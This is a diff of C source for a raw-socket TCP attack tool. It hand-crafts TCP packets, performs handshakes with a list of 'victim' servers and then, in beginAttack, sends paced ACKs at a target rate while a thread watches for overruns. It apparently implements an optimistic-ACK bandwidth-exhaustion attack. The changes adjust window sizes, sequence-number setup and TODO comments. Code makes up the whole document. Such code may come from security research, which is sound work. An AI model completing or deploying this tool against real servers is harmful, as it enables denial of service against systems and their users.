@@ -166,7 +166,7 @@ int send_packet(int socket,
       data = (char *) (packet + sizeof(struct tcphdr));
       tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
     }
-    
+
     memcpy(data, content, content_length);
 
     //Populate tcpHdr
@@ -194,7 +194,7 @@ int send_packet(int socket,
     tcpHdr->rst = rst; //RST flag
     tcpHdr->syn = syn; //SYN flag
     tcpHdr->fin = fin; //Terminates the connection
-    tcpHdr->window = htons(window);//0xFFFF; //16 bit max number of databytes 
+    tcpHdr->window = window;//0xFFFF; //16 bit max number of databytes
     tcpHdr->check = 0; //16 bit check sum. Can't calculate at this point
     tcpHdr->urg_ptr = 0; //16 bit indicate the urgent data. Only if URG flag is set
 
@@ -212,7 +212,7 @@ int send_packet(int socket,
 
   //Copy pseudo header
   memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));
- 
+
   //Calculate check sum: zero current check, copy TCP header + data to pseudo TCP packet, update check
   tcpHdr->check = 0;
 
@@ -234,12 +234,16 @@ int send_packet(int socket,
 
 
 }
-
 unsigned getIndex(u_int32_t ip) {
 	unsigned index;
 	index = ip>>24;
 	return index;
 }
+/* TODO This will take 3 arguments. The list of all the connections
+ * the socket, and the victim to return on.
+ * If any packets arrive that do not belong to the current host,
+ * it will check for an overrun
+ */
 unsigned read_packet(struct victim_connection *m_victim, int sock) {
     // TODO keep reading the socket for a relevent ip
     // update the sequence number
@@ -267,7 +271,7 @@ unsigned read_packet(struct victim_connection *m_victim, int sock) {
           //printf("Packet size (bytes) %d\n", ntohs(ip_packet->tot_len));
           //printf("Source Address: %s\n", (char *)inet_ntoa(source_socket_address.sin_addr));
           //printf("Destination Address: %s\n", (char *)inet_ntoa(dest_socket_address.sin_addr));
-          //printf("Identification: %d\n\n", ntohs(ip_packet->id)); 
+          //printf("Identification: %d\n\n", ntohs(ip_packet->id));
           return ntohl(tcph->seq);
         } else {
           //printf("Does not match\n");
@@ -289,7 +293,7 @@ void handshake(struct victim_connection *m_victim, int sock) {
     int w_scale = 0;
 	send_packet(sock,m_victim,send_seq,ack_nbr,
 				content,content_length,1,fin,rst,0,
-				46085,w_scale);
+				MSS,w_scale);
 	unsigned read_seq = read_packet(m_victim, sock);
   //printf("Received packet with sequence num: %u\n", read_seq);
   send_seq +=1;
@@ -298,12 +302,12 @@ void handshake(struct victim_connection *m_victim, int sock) {
   //printf("Handshake ack_nbr: %u, %ld, %ld",read_seq, ack_nbr, (long) read_seq + 1);
 	send_packet(sock,m_victim,send_seq,ack_nbr,
 				content,content_length,syn,fin,rst,1,
-				53270,w_scale);
+				window,w_scale);
 	content="GET / HTTP/1.0\r\n\r\n";
   content_length = strlen(content);
 	send_packet(sock,m_victim,send_seq,ack_nbr,
 				content,content_length,syn,fin,rst,1,
-				53270,w_scale);
+				window,w_scale);
 	m_victim->send_seq = send_seq + content_length;
 
 }
@@ -314,8 +318,6 @@ void handshake(struct victim_connection *m_victim, int sock) {
 void *checkOverruns(void *vargp) {
 
     struct pace_args *m_args = (struct pace_args*) vargp;
-
-    m_args->m_victim->last_received_seq = m_args->m_victim->start_ack;
 
     struct timeval start_time, current_time;
     gettimeofday(&start_time, NULL);
@@ -374,15 +376,17 @@ int beginAttack(int duration, double target_rate) {
     	}
 			m_victims[i]=m_victim;
 		}
-
-    // TODO Connect to each server using 3-way handshake
+    
+    // TODO FOR MULTI CONNECTION DO THE NEXT 3 LINES TOGETHER FOR EACH
+    // VICTIM
+    // Connect to each server using 3-way handshake
 		for(i=0; i<victims; i++){
     	handshake(&m_victim, sock);
 		}
 
     // Get the start ack for each connection
     unsigned read_seq = read_packet(&m_victim, sock);
-    m_victim.start_ack = m_victim.last_sent_ack = read_seq;
+    m_victim.start_ack = m_victim.last_received_seq = m_victim.last_sent_ack = read_seq;
 
     // Begin the pace thread to observe overruns
     // TODO
@@ -427,7 +431,7 @@ int beginAttack(int duration, double target_rate) {
                   0,                          // fin
                   0,                          // rst
                   1,                          // is_ack
-                  53270,                      // window
+                  5840,                       // window
                   0);                         // w_scale
 
       gettimeofday(&after_sent, NULL);
@@ -475,7 +479,7 @@ int beginAttack(int duration, double target_rate) {
                 1,                            // fin
                 0,                            // rst
                 0,                            // is_ack
-                53270,                        // window
+                5840,                         // window
                 0);                           // w_scale
 
     pthread_join(tid, NULL);
